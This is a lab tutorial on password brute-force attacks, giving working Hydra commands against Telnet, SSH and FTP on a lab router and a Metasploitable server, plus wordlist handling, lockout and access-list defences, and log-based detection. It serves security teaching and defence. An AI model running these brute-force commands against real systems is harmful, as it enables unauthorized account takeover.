# Password Attack

## What is a Password Attack?

A password attack (also called brute force or dictionary attack) is a method used to gain unauthorized access to a system by systematically attempting multiple password combinations. Attackers use automated tools to try common passwords, dictionary words, or all possible character combinations until the correct password is found. These attacks exploit weak passwords and can compromise network devices, servers, and applications.

## Attack Scenario

* **Target Router (EDG):** 192.168.1.1
* **Target FTP Server (Metasploitable):** 192.168.1.5
* **Attacker IP Address:** 192.168.1.8
* **Attack Tool:** Hydra

## Lab Environment Setup

### Router Configuration (EDG)

Configure the target router to allow remote access:

```cisco
EDG# configure terminal
EDG(config)# line vty 0 4
EDG(config-line)# transport input all
EDG(config-line)# login local
EDG(config-line)# exit
EDG(config)# username admin password 123456
EDG(config)# exit
```

**Configuration breakdown:**
* `line vty 0 4` - Configure virtual terminal lines 0-4
* `transport input all` - Allow both Telnet and SSH connections
* `login local` - Use local username/password authentication
* `username admin password 123456` - Create user with weak password (for lab purposes)

## How the Attack Works

### 1. Telnet Password Attack

**Attack command:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 -V telnet
```

**Parameter explanation:**
* `-l admin` - Specifies the username to test
* `-P /usr/share/wordlists/rockyou.txt` - Path to password wordlist
* `192.168.1.1` - Target IP address
* `-V` - Verbose mode (shows each attempt)
* `telnet` - Protocol to attack

**What happens during the attack:**
1. Hydra reads passwords from the wordlist file
2. For each password, it attempts a Telnet login
3. Each attempt is displayed in verbose mode
4. When successful, the password is displayed in green

**Detecting the attack on the router:**
```cisco
EDG# who
EDG# show users
```
These commands show active connection attempts and can reveal brute force activity.

**Expected output when password is found:**
```
[ATTEMPT] target 192.168.1.1 - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[23][telnet] host: 192.168.1.1   login: admin   password: 123456
1 of 1 target successfully completed, 1 valid password found
```

### 2. SSH Password Attack

**Attack command:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 -V ssh
```

**Differences from Telnet attack:**
* Uses SSH protocol (port 22) instead of Telnet (port 23)
* SSH provides encrypted communication
* Slightly slower due to encryption overhead
* More commonly found in production environments

**SSH-specific options:**
```bash
# Specify SSH port if non-standard
hydra -l admin -P wordlist.txt -s 2222 192.168.1.1 ssh

# Use multiple threads for faster attack
hydra -l admin -P wordlist.txt -t 4 192.168.1.1 ssh
```

### 3. FTP Password Attack

**Target:** Metasploitable server at 192.168.1.5

**Attack command:**
```bash
hydra -l msfadmin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://192.168.1.5 -V
```

**FTP-specific considerations:**
* FTP typically allows anonymous login attempts
* No encryption (credentials sent in plaintext)
* Easy to detect in network traffic
* Common target for automated attacks

### 4. Custom Wordlist Management

**If password not found, add to wordlist:**

```bash
# Navigate to wordlist directory
cd /usr/share/metasploit-framework/data/wordlists/

# List available wordlists
ls

# Edit the wordlist
vi unix_passwords.txt
# or
nano unix_passwords.txt

# Add passwords (one per line)
# Save and exit
```

**Creating custom wordlists:**
```bash
# Create a simple wordlist
echo -e "password123\nadmin\n123456\nletmein" > custom_wordlist.txt

# Combine multiple wordlists
cat wordlist1.txt wordlist2.txt > combined.txt

# Remove duplicates
sort -u combined.txt > unique_wordlist.txt
```

## Hydra Command Options

### Basic Syntax
```bash
hydra [options] target protocol
```

### Common Options

| Option | Description | Example |
|--------|-------------|---------|
| `-l` | Single username | `-l admin` |
| `-L` | Username list file | `-L users.txt` |
| `-p` | Single password | `-p password123` |
| `-P` | Password list file | `-P rockyou.txt` |
| `-t` | Number of parallel tasks | `-t 16` |
| `-V` | Verbose mode | `-V` |
| `-f` | Exit after first found pair | `-f` |
| `-s` | Specify port | `-s 2222` |
| `-o` | Output file | `-o results.txt` |

### Advanced Examples

**Attack with username and password lists:**
```bash
hydra -L users.txt -P passwords.txt 192.168.1.1 ssh
```

**Attack multiple protocols:**
```bash
hydra -l admin -P wordlist.txt 192.168.1.1 -s 22 ssh
hydra -l admin -P wordlist.txt 192.168.1.1 -s 23 telnet
```

**Attack with specific number of threads:**
```bash
hydra -l admin -P rockyou.txt -t 4 192.168.1.1 ssh
```

**Save results to file:**
```bash
hydra -l admin -P wordlist.txt -o found_passwords.txt 192.168.1.1 ssh
```

**Resume interrupted session:**
```bash
hydra -R
```

## Supported Protocols

Hydra supports password attacks on numerous protocols:

* **Network Services:** SSH, Telnet, FTP, HTTP(S), SMTP, POP3, IMAP
* **Databases:** MySQL, PostgreSQL, MongoDB, MSSQL, Oracle
* **VPN:** Cisco VPN, IPsec
* **Remote Desktop:** RDP, VNC
* **Web Forms:** HTTP-GET, HTTP-POST
* **Others:** SMB, LDAP, Redis, SNMP

## Common Wordlists

### Kali Linux Default Locations:

```bash
# RockYou - Most popular password list (14+ million passwords)
/usr/share/wordlists/rockyou.txt

# Metasploit wordlists
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/passwords.lst

# SecLists
/usr/share/seclists/Passwords/

# John the Ripper
/usr/share/john/password.lst
```

### Extracting RockYou (if compressed):
```bash
cd /usr/share/wordlists/
gunzip rockyou.txt.gz
```

## Effects of Password Attacks

* **Unauthorized Access:** Complete control over compromised accounts
* **Lateral Movement:** Using compromised credentials to access other systems
* **Data Breach:** Access to sensitive information
* **Service Disruption:** Account lockouts from failed attempts
* **Privilege Escalation:** Compromising admin accounts
* **Compliance Violations:** Unauthorized access to regulated data

## Defense Against Password Attacks

### 1. **Strong Password Policy**
* Minimum 12-16 characters
* Combination of uppercase, lowercase, numbers, and symbols
* No dictionary words or common patterns
* Regular password changes
* No password reuse

### 2. **Account Lockout Policies**
```cisco
# Cisco router example
EDG(config)# login block-for 300 attempts 5 within 60
EDG(config)# login quiet-mode access-class ACL_PERMIT
```
This locks accounts after 5 failed attempts within 60 seconds for 300 seconds.

### 3. **Rate Limiting**
* Implement delays between authentication attempts
* Use progressive delays (exponential backoff)
* Limit concurrent connection attempts

### 4. **Multi-Factor Authentication (MFA)**
* Require additional authentication factor
* Hardware tokens, SMS codes, authenticator apps
* Biometric authentication

### 5. **IP Whitelisting**
```cisco
# Allow SSH only from specific IPs
EDG(config)# access-list 10 permit 192.168.1.100
EDG(config)# line vty 0 4
EDG(config-line)# access-class 10 in
```

### 6. **Disable Unnecessary Services**
```cisco
# Disable Telnet (use only SSH)
EDG(config)# line vty 0 4
EDG(config-line)# transport input ssh
```

### 7. **Monitoring and Logging**
* Enable comprehensive authentication logging
* Set up alerts for multiple failed attempts
* Use SIEM solutions for correlation
* Regular log review

### 8. **Network Segmentation**
* Isolate management interfaces
* Use dedicated management VLANs
* Implement firewall rules

## Detection Methods

### System Logs:
```bash
# Linux - Check authentication logs
tail -f /var/log/auth.log
grep "Failed password" /var/log/auth.log

# View recent failed login attempts
lastb

# Count failed login attempts by IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
```

### Router Logs:
```cisco
# View login attempts
EDG# show logging | include LOGIN

# View active users
EDG# show users

# Configure logging
EDG(config)# logging buffered 51200 debugging
```

### Network Monitoring:
* Monitor for repeated connection attempts to authentication ports
* Look for unusual traffic patterns to ports 22, 23, 21, 3389
* Track connection attempts from single source IPs

### IDS/IPS Signatures:
* Configure alerts for brute force patterns
* Set thresholds for authentication failures
* Create custom rules for specific protocols
